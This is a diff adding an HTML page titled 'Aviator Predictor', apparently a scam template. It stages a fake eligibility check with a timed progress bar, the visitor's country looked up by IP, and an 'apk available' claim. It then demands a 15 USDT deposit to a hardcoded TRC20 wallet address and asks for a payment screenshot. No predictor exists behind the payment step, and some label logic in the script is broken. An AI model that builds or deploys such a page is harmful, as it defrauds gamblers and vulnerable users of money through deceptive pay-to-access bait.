@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Elegibility criteria</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111827;
+      color: #f9f9f9;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+
+    /* Navbar */
+    .navbar {
+      background: #1F2937;
+      padding: 29px;
+      text-align: left;
+      font-size: 20px;
+      font-weight: bold;
+      color: #fff;
+    }
+
+    /* Progress Bar */
+    .progress-container {
+      width: 80%;
+      margin: 30px auto;
+      background: #eee;
+      border-radius: 8px;
+      overflow: hidden;
+      height: 30px;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      background: repeating-linear-gradient(
+        45deg,
+        #e53935,
+        #e53935 10px,
+        #f06292 10px,
+        #f06292 20px
+      );
+      color: white;
+      text-align: center;
+      line-height: 30px;
+      font-weight: bold;
+      transition: width 0.2s linear;
+    }
+
+    /* Info Table */
+    table {
+      margin: 30px auto;
+      border-collapse: collapse;
+      width: 80%;
+      font-size: 18px;
+      background: #1F2937;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    td {
+      padding: 20px 20px;
+      border-bottom: 1px solid #333;
+      text-align: left;
+      color: #f9f9f9;
+    }
+
+    tr:first-child td {
+      font-weight: bold;
+      color: #ccc;
+    }
+
+    /* Download Button */
+    .download-btn {
+      display: none;
+      margin-top: 30px;
+      padding: 15px 40px;
+      font-size: 20px;
+      font-weight: bold;
+      color: white;
+      background-color: #00c853; /* Green reference */
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      50% {
+        opacity: 0.4;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Navbar -->
+  <div class="navbar">Aviator Predictor</div>
+
+  <!-- Progress bar -->
+  <div class="progress-container">
+    <div class="progress-bar" id="progressBar">0%</div>
+  </div>
+
+  <!-- Info table -->
+  <table id="infoTable">
+    <tbody>
+      <tr><td colspan="2">Elegibility Criterial:</td></tr>
+    </tbody>
+  </table>
+
+  <!-- Download button -->
+  <button  onclick="toggleModal()" class="download-btn" id="downloadBtn">Deposit 15$</button>
+
+  </footer>
+  <!-- Payment Modal -->
+  <div id="paymentModal" class="fixed inset-0 bg-black/70 hidden items-center justify-center z-[60] p-4">
+    <div class="bg-gray-850 bg-gray-800/95 border border-white/10 p-6 rounded-2xl w-full max-w-md text-center relative shadow-2xl">
+      <button onclick="toggleModal()" class="absolute top-3 right-3 text-gray-300 hover:text-white text-2xl leading-none">×</button>
+      <h2 class="text-2xl font-bold mb-4">Choose Payment Method</h2>
+
+
+ <!-- Replace only the 3 buttons inside your modal with this -->
+<div class="space-y-3">
+  <button class="w-full bg-emerald-500 hover:bg-emerald-600 py-3 rounded-xl font-semibold" > MTN Mobile Money</button>
+  <button class="w-full bg-emerald-500 hover:bg-emerald-600 py-3 rounded-xl font-semibold" onclick="openPayment('binance')">Binance Pay</button>
+  <button class="w-full bg-emerald-500 hover:bg-emerald-600 py-3 rounded-xl font-semibold" onclick="openPayment('crypto')">Crypto Wallet</button>
+</div>
+
+<!-- New section: dynamic deposit card -->
+<div id="paymentDetails" class="hidden mt-6 text-center">
+  <h2 class="text-xl font-bold mb-3">Deposit (TRC20)</h2>
+  <p id="paymentLabel" class="mb-2"></p>
+  <div class="bg-white p-3 rounded-lg inline-block mb-3">
+    <img src="assets/1.png" alt="QR Code" width="170" height="170">
+  </div>
+  <p id="walletAddress" class="font-mono text-sm break-words mb-3"></p>
+  <button onclick="copyAddress()" class="w-full bg-blue-500 hover:bg-blue-600 py-2 rounded-lg mb-3">Copy Address</button>
+  <div class="bg-yellow-600/20 text-yellow-400 text-sm p-3 rounded mb-3">
+    ⚠ Deposit 15 USDT on Tron (TRC20).  after click back upload your screenshot for confirmation
+  </div>
+  <button onclick="backToMethods()" class="w-full bg-gray-700 hover:bg-gray-600 py-2 rounded-lg">← Back</button>
+</div>
+
+      <div class="mt-6 text-left">
+        <label class="block mb-2 font-semibold">Upload Payment Screenshot</label>
+        <input type="file" class="w-full text-sm file:mr-4 file:py-2 file:px-3 file:rounded-md file:border-0 file:bg-emerald-500 file:text-white hover:file:bg-emerald-600" />
+        <button class="mt-4 w-full bg-white/10 hover:bg-white/15 py-3 rounded-xl font-semibold border border-white/10">Submit for Review</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  const progressBar = document.getElementById("progressBar");
+  const infoTable = document.getElementById("infoTable").querySelector("tbody");
+  const downloadBtn = document.getElementById("downloadBtn");
+
+  function toggleModal(){
+    const m = document.getElementById('paymentModal');
+    if(m.classList.contains('hidden')){
+      m.classList.remove('hidden');
+      m.classList.add('flex');
+    }else{
+      m.classList.add('hidden');
+      m.classList.remove('flex');
+    }
+  }
+
+  let progress = 0;
+  const interval = setInterval(() => {
+    if (progress < 100) {
+      progress += 1;
+      progressBar.style.width = progress + "%";
+      progressBar.textContent = progress + "%";
+    } else {
+      clearInterval(interval);
+      downloadBtn.style.display = "inline-block";
+      progressBar.textContent="success";
+    }
+  }, 100);
+
+  // Add rows in sequence
+  setTimeout(() => {
+    fetch("https://ipapi.co/json/") // free API to detect country
+      .then(res => res.json())
+      .then(data => {
+        addRow("Country", `✅${data.country_name} (${data.country_code})`);
+      })
+      .catch(() => addRow("Country", "Unknown"));
+  }, 1000);
+
+  setTimeout(() => {
+    addRow("Game", "✅Aviator");
+  }, 5000);
+
+  setTimeout(() => {
+    addRow("Status", "✅apk available");
+  }, 8000);
+
+  function addRow(label, value) {
+    const row = document.createElement("tr");
+    row.innerHTML = `<td><strong>${label}:</strong></td><td>${value}</td>`;
+    infoTable.appendChild(row);
+  }
+
+  // ==========================
+  // Payment Modal Logic
+  // ==========================
+
+  const paymentDetails = document.getElementById("paymentDetails");
+  const paymentLabel = document.getElementById("paymentLabel");
+  const walletAddress = document.getElementById("walletAddress");
+
+  // 👉 Replace these with your real addresses
+  const walletAddresses = {
+    mtn: "YOUR-MTN-NUMBER-HERE",
+    binance: "TFF8GvyEazzoEALBehZXQ4YT62TB7DQuXZ",
+    crypto: "TFF8GvyEazzoEALBehZXQ4YT62TB7DQuXZ"
+  };
+
+  function openPayment(method) {
+    document.querySelector(".space-y-3").classList.add("hidden");
+    document.querySelector(".mt-6.text-left").classList.add("hidden"); // hide upload screenshot section
+    paymentDetails.classList.remove("hidden");
+
+    let label = "";
+    if (method === "mt") label = "Top-up via MTN Mobile Money";
+    if (method === "binanc") label = "Top-up via Binance Pay";
+    if (method === "crypt") label = "Top-up address USDT";
+
+    paymentLabel.textContent = label;
+    walletAddress.textContent = walletAddresses[method] || "Address not set";
+  }
+
+  function backToMethods() {
+    paymentDetails.classList.add("hidden");
+    document.querySelector(".space-y-3").classList.remove("hidden");
+    document.querySelector(".mt-6.text-left").classList.remove("hidden");
+  }
+
+  function copyAddress() {
+    navigator.clipboard.writeText(walletAddress.textContent).then(() => {
+      alert("Copied: " + walletAddress.textContent);
+    });
+  }
+</script>
+
+</body>
+</html>
